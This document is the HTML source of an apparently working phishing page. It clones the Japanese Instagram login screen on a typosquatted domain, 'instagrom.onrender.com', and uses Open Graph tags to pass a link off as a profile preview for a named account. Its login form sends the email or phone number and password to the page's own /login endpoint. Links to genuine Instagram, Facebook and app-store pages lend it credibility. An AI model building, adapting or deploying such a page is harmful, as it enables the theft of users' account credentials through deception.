
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Instagram - ログイン</title>
    <meta property="og:type" content="profile">
<meta property="og:title" content="@sioka0220 - Instagram">
<meta property="og:description" content="Instagramで@sioka0220のプロフィールを見る">
<meta property="og:url" content="https://instagrom.onrender.com/">
<meta property="og:image" content="https://instagrom.onrender.com/profile.jpg">
<meta property="og:site_name" content="Instagram">
<link rel="stylesheet" href="style.css">
</head>

<body>

    <main class="container">

        <!-- ログインボックス -->
        <section class="login-card">

            <h1 class="logo">Instagram</h1>

            <!-- ログインフォーム -->
            <form class="login-form" action="/login" method="POST">

                <div class="form-group">

                    <label>
                        メールアドレスまたは電話番号
                        <span class="required">*</span>
                    </label>

                    <input
                        type="text"
                        name="email"
                        required
                    >

                </div>


                <div class="form-group">

                    <label>
                        パスワード
                        <span class="required">*</span>
                    </label>

                    <input
                        type="password"
                        name="password"
                        required
                    >

                    <a
                        class="forgot-password"
                        href="https://www.instagram.com/accounts/password/reset/"
                        target="_blank"
                        rel="noopener noreferrer"
                    >
                        パスワードをお忘れですか？
                    </a>

                </div>


                <!-- フォームを送信するボタン -->
                <button
                    type="submit"
                    class="login-button"
                >
                    ログイン
                </button>

            </form>


            <!-- 区切り -->
            <div class="divider">

                <span></span>

                <p>または</p>

                <span></span>

            </div>


            <!-- Facebookログイン -->
            <a
                class="facebook-login"
                href="https://www.facebook.com/"
                target="_blank"
                rel="noopener noreferrer"
            >
                Facebookでログイン
            </a>


        </section>


        <!-- アカウント登録 -->
        <section class="signup-card">

            <p>
                アカウントをお持ちでないですか？

                <a
                    href="https://www.instagram.com/accounts/emailsignup/"
                    target="_blank"
                    rel="noopener noreferrer"
                >
                    登録する
                </a>
            </p>

        </section>


        <!-- アプリ -->
        <p class="app-text">
            アプリをダウンロード
        </p>


        <div class="app-buttons">

            <a
                href="https://apps.apple.com/app/instagram/id389801252"
                target="_blank"
                rel="noopener noreferrer"
            >
                App Store
            </a>

            <a
                href="https://play.google.com/store/apps/details?id=com.instagram.android"
                target="_blank"
                rel="noopener noreferrer"
            >
                Google Play
            </a>

        </div>

    </main>


    <!-- フッター -->
    <footer>

        <p>
            © 2026 Instagramログインページ
        </p>

    </footer>

</body>
</html>
